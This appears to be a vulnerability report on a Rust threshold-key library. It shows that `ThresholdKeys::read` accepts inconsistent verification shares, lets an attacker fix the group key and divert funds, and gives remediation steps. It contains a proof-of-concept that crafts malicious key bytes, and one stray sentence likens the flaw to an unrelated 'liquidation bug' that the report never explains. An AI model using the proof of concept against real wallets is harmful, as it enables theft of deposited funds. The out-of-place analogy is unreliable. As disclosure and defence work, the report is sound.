### Title
`ThresholdKeys::read` accepts irrelevant residual verification shares, allowing attacker-controlled threshold keys - ([File: crypto/dkg/src/lib.rs](crypto/dkg/src/lib.rs))

### Summary

`ThresholdKeys::new` derives the advertised group key only from verification shares `1..=t`, while accepting `n` verification shares without checking that the remaining shares belong to the same threshold sharing or that the local secret share matches its verification share. Consequently, bytes supplied to `ThresholdKeys::read` can encode a claimed `t`-of-`n` key whose group key is controlled entirely by the first `t` shares, leaving residual participants unable to spend while still appearing valid to the API. [1](#0-0) [2](#0-1) 

### Finding Description

`ThresholdKeys::read` deserializes a secret share and all `n` verification shares, then passes them to `ThresholdKeys::new`. [2](#0-1) 

`ThresholdKeys::new` only validates the number of verification shares and that participant indexes do not exceed `n`. It does not verify:

- `C::generator() * secret_share == verification_shares[params.i()]`
- that any verification share after index `t` lies on the same polynomial/sharing
- that verification shares are non-identity
- that every claimed participant can contribute toward the advertised `group_key` [3](#0-2) 

Instead, `group_key` is calculated exclusively from participants `1..=t`:

```rust
let t = (1 ..= params.t()).map(Participant).collect::<Vec<_>>();
let group_key =
  t.iter().map(|i| verification_shares[i] * interpolation.interpolation_factor(*i, &t)).sum();
``` [4](#0-3) 

This is analogous to the liquidation bug's complete-position gate: the protective consistency check only covers the primary/first `t` positions and leaves residual state unchecked. An attacker can leave a “dust” participant in the serialized key whose verification share is irrelevant to the computed group key.

Later, `ThresholdKeys::view` accepts that residual participant as part of a signing set and uses their unrelated verification share when producing the signing view. [5](#0-4) 

### Impact Explanation

An attacker who can cause a victim to consume attacker-chosen `ThresholdKeys` bytes can make the victim operate on a group key that does not represent the victim's claimed threshold participation.

For example, a serialized `1`-of-`2` key for participant `2` can contain:

- participant `1` verification share `G * attacker_secret`
- participant `2` verification share equal to the identity
- participant `2` secret share equal to zero

The resulting `group_key()` is simply `G * attacker_secret`. If the victim uses this group key to generate a deposit address, deposited funds are controlled by the attacker, while the victim's imported key cannot produce a valid signature for that group key.

More generally, malformed residual shares can make some or all claimed signing sets unable to spend funds sent to the advertised threshold key, or conceal that the effective key is controlled by a smaller/different set than the parameters imply. [6](#0-5) [7](#0-6) 

### Likelihood Explanation

The malicious object does not require compromised local secrets, malformed scalar encodings, non-canonical points, or protocol collusion. `ThresholdKeys::read` is a public deserialization API and accepts canonical-but-semantically-invalid field and group elements. A malicious backup, key package, coordinator-supplied key blob, or other untrusted serialized `ThresholdKeys` input can therefore reach the flaw directly.

Exploitation is deterministic: the attacker chooses arbitrary verification shares and knows that indexes after `t` are ignored by `group_key` derivation. The impact requires a caller to import or deserialize attacker-controlled threshold keys before using `group_key()` for receiving funds, which is precisely the dangerous boundary exposed by the public `read` API. [8](#0-7) 

### Recommendation

`ThresholdKeys::new` should reject semantically inconsistent keys instead of deriving the group key from only the first `t` verification shares.

At minimum:

1. Reject identity verification shares.
2. Verify `C::generator() * secret_share == verification_shares[&params.i()]`.
3. Reconstruct the degree-`t - 1` verification polynomial represented by the first `t` verification shares and verify every participant `1..=n` has the expected verification share.
4. For `Interpolation::Constant`, validate that the coefficient count is exactly `n` and that the shares satisfy the constant-interpolation rules rather than relying on later indexing.
5. Consider storing the interpolated coefficient commitments or a separately authenticated group-key commitment so deserialization can validate all supplied shares against it.

Simply checking the local secret share is insufficient; all `n` verification shares must be proven to belong to the same sharing.

### Proof of Concept

Conceptual proof for any supported `Ciphersuite` with canonical identity point encodings:

```rust
// Serialized format used by ThresholdKeys::write:
//   u32 C::ID.len()
//   C::ID
//   u16 t
//   u16 n
//   u16 i
//   interpolation tag
//   secret_share
//   verification_shares[1..=n]

let attacker_secret = C::F::from(1337);
let attacker_share = C::generator() * attacker_secret;

let mut bytes = Vec::new();

// Curve ID.
bytes.extend(u32::try_from(C::ID.len()).unwrap().to_le_bytes());
bytes.extend(C::ID);

// t = 1, n = 2, local participant = 2.
bytes.extend(1u16.to_le_bytes());
bytes.extend(2u16.to_le_bytes());
bytes.extend(2u16.to_le_bytes());

// Lagrange interpolation.
bytes.push(1);

// Local participant's secret share: zero.
bytes.extend(C::F::ZERO.to_repr().as_ref());

// Participant 1 verification share: attacker-controlled key.
bytes.extend(attacker_share.to_bytes().as_ref());

// Participant 2 verification share: identity.
// This is the residual share ignored by group-key derivation.
bytes.extend(C::G::identity().to_bytes().as_ref());

let keys = ThresholdKeys::<C>::read(&mut bytes.as_slice()).unwrap();

// The advertised group key is controlled solely by attacker_secret.
assert_eq!(keys.group_key(), attacker_share);

// The imported key nevertheless claims to be participant 2.
assert_eq!(keys.params().i(), Participant::new(2).unwrap());

// A deposit address derived from this group key is spendable by the attacker,
// not by the imported participant-2 key.
```

The acceptance boundary is `ThresholdKeys::read`, which reads all serialized shares and delegates to `ThresholdKeys::new`; the bypass occurs because `new` derives `group_key` only from `verification_shares[1]` for `t = 1`, ignoring the malicious residual share at index `2`. [9](#0-8) [10](#0-9)

### Citations

**File:** crypto/dkg/src/lib.rs (L355-365)
```rust
    if verification_shares.len() != usize::from(params.n()) {
      Err(DkgError::IncorrectAmountOfVerificationShares {
        n: params.n(),
        shares: verification_shares.len(),
      })?;
    }
    for participant in verification_shares.keys().copied() {
      if u16::from(participant) > params.n() {
        Err(DkgError::InvalidParticipant { n: params.n(), participant })?;
      }
    }
```

**File:** crypto/dkg/src/lib.rs (L376-379)
```rust
    let t = (1 ..= params.t()).map(Participant).collect::<Vec<_>>();
    let group_key =
      t.iter().map(|i| verification_shares[i] * interpolation.interpolation_factor(*i, &t)).sum();

```

**File:** crypto/dkg/src/lib.rs (L445-458)
```rust
  pub fn group_key(&self) -> C::G {
    (self.core.group_key * self.scalar) + (C::generator() * self.offset)
  }

  /// Return the underlying secret share for these keys, without any tweaks applied.
  pub fn original_secret_share(&self) -> &Zeroizing<C::F> {
    &self.core.secret_share
  }

  /// Return the original (untweaked) verification share for the specified participant.
  ///
  /// This will panic if the participant index is invalid for these keys.
  pub fn original_verification_share(&self, l: Participant) -> C::G {
    self.core.verification_shares[&l]
```

**File:** crypto/dkg/src/lib.rs (L463-530)
```rust
  pub fn view(&self, mut included: Vec<Participant>) -> Result<ThresholdView<C>, DkgError> {
    if (included.len() < self.params().t.into()) ||
      (usize::from(self.params().n()) < included.len())
    {
      Err(DkgError::IncorrectAmountOfParticipants {
        t: self.params().t,
        n: self.params().n,
        amount: included.len(),
      })?;
    }
    included.sort();
    {
      let mut found = included[0] == self.params().i();
      for i in 1 .. included.len() {
        if included[i - 1] == included[i] {
          Err(DkgError::DuplicatedParticipant(included[i]))?;
        }
        found |= included[i] == self.params().i();
      }
      if !found {
        Err(DkgError::NotParticipating)?;
      }
    }
    {
      let last = *included.last().unwrap();
      if u16::from(last) > self.params().n() {
        Err(DkgError::InvalidParticipant { n: self.params().n(), participant: last })?;
      }
    }

    // The interpolation occurs multiplicatively, letting us scale by the scalar now
    let secret_share_scaled = Zeroizing::new(self.scalar * self.original_secret_share().deref());
    let mut secret_share = Zeroizing::new(
      self.core.interpolation.interpolation_factor(self.params().i(), &included) *
        secret_share_scaled.deref(),
    );

    let mut verification_shares = HashMap::with_capacity(included.len());
    for i in &included {
      let verification_share = self.core.verification_shares[i];
      let verification_share = verification_share *
        self.scalar *
        self.core.interpolation.interpolation_factor(*i, &included);
      verification_shares.insert(*i, verification_share);
    }

    /*
      The offset is included by adding it to the participant with the lowest ID.

      This is done after interpolating to ensure, regardless of the method of interpolation, that
      the method of interpolation does not scale the offset. For Lagrange interpolation, we could
      add the offset to every key share before interpolating, yet for Constant interpolation, we
      _have_ to add it as we do here (which also works even when we intend to perform Lagrange
      interpolation).
    */
    if included[0] == self.params().i() {
      *secret_share += self.offset;
    }
    *verification_shares.get_mut(&included[0]).unwrap() += C::generator() * self.offset;

    Ok(ThresholdView {
      interpolation: self.core.interpolation.clone(),
      scalar: self.scalar,
      offset: self.offset,
      group_key: self.group_key(),
      secret_share,
      original_verification_shares: self.core.verification_shares.clone(),
      verification_shares,
```

**File:** crypto/dkg/src/lib.rs (L539-560)
```rust
    writer.write_all(&u32::try_from(C::ID.len()).unwrap().to_le_bytes())?;
    writer.write_all(C::ID)?;
    writer.write_all(&self.core.params.t.to_le_bytes())?;
    writer.write_all(&self.core.params.n.to_le_bytes())?;
    writer.write_all(&self.core.params.i.to_bytes())?;
    match &self.core.interpolation {
      Interpolation::Constant(c) => {
        writer.write_all(&[0])?;
        for c in c {
          writer.write_all(c.to_repr().as_ref())?;
        }
      }
      Interpolation::Lagrange => writer.write_all(&[1])?,
    };
    let mut share_bytes = self.core.secret_share.to_repr();
    writer.write_all(share_bytes.as_ref())?;
    share_bytes.as_mut().zeroize();
    for l in 1 ..= self.core.params.n {
      writer.write_all(
        self.core.verification_shares[&Participant::new(l).unwrap()].to_bytes().as_ref(),
      )?;
    }
```

**File:** crypto/dkg/src/lib.rs (L573-631)
```rust
  /// Read keys from a type satisfying `std::io::Read`.
  pub fn read<R: io::Read>(reader: &mut R) -> io::Result<ThresholdKeys<C>> {
    {
      let different = || io::Error::other("deserializing ThresholdKeys for another curve");

      let mut id_len = [0; 4];
      reader.read_exact(&mut id_len)?;
      if u32::try_from(C::ID.len()).unwrap().to_le_bytes() != id_len {
        Err(different())?;
      }

      let mut id = vec![0; C::ID.len()];
      reader.read_exact(&mut id)?;
      if id != C::ID {
        Err(different())?;
      }
    }

    let (t, n, i) = {
      let mut read_u16 = || -> io::Result<u16> {
        let mut value = [0; 2];
        reader.read_exact(&mut value)?;
        Ok(u16::from_le_bytes(value))
      };
      (
        read_u16()?,
        read_u16()?,
        Participant::new(read_u16()?).ok_or(io::Error::other("invalid participant index"))?,
      )
    };

    let mut interpolation = [0];
    reader.read_exact(&mut interpolation)?;
    let interpolation = match interpolation[0] {
      0 => Interpolation::Constant({
        let mut res = Vec::with_capacity(usize::from(n));
        for _ in 0 .. n {
          res.push(C::read_F(reader)?);
        }
        res
      }),
      1 => Interpolation::Lagrange,
      _ => Err(io::Error::other("invalid interpolation method"))?,
    };

    let secret_share = Zeroizing::new(C::read_F(reader)?);

    let mut verification_shares = HashMap::new();
    for l in (1 ..= n).map(Participant) {
      verification_shares.insert(l, <C as Ciphersuite>::read_G(reader)?);
    }

    ThresholdKeys::new(
      ThresholdParams::new(t, n, i).map_err(io::Error::other)?,
      interpolation,
      secret_share,
      verification_shares,
    )
    .map_err(io::Error::other)
```
